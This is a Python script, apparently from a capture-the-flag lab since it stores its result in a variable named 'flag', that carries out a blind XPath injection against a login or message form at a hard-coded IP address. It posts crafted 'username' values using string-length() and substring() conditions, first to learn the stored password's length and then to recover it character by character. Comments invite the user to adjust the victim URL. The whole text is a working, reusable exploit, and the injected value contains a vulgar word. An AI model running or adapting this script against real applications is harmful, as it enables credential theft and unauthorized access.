#!/usr/bin/python3
import httplib2, string

flag = ""
l = 0
#Adjust to the victim URL
URL = "http://94.237.55.163:42792/index.php"
http = httplib2.Http()
#Adjust if you need less/more chars
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(50): 
    #Adjust the URL encoded params in the body
    params = "username=pizda'+or+string-length(/accounts/acc[1]/password)=%s+and+'1'='1&msg=Hello" %(i)
    send = http.request(URL,method="POST",headers={'Content-Type': 'application/x-www-form-urlencoded'},body=params)[1]
    #Adjust the success message in the html so the cycle knows when to stop
    if ("Message successfully sent!" in send.decode()): 
        l = i 
        break 
print("[+] Password length: " + str(l)) 
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i)) 
    for al in alphabet: 
        #Adjust the URL encoded params in the body
        params = "username=pizda'+or+substring(/accounts/acc[1]/password,"+str(i)+",1)='"+al+"' and '1'='1&message=Hello"
        send = http.request(URL,method="POST",headers={'Content-Type': 'application/x-www-form-urlencoded'},body=params)[1]
        if ("Message successfully sent!" in send.decode()): 
            flag += al
            print("[+] Flag: " + flag) 
            break
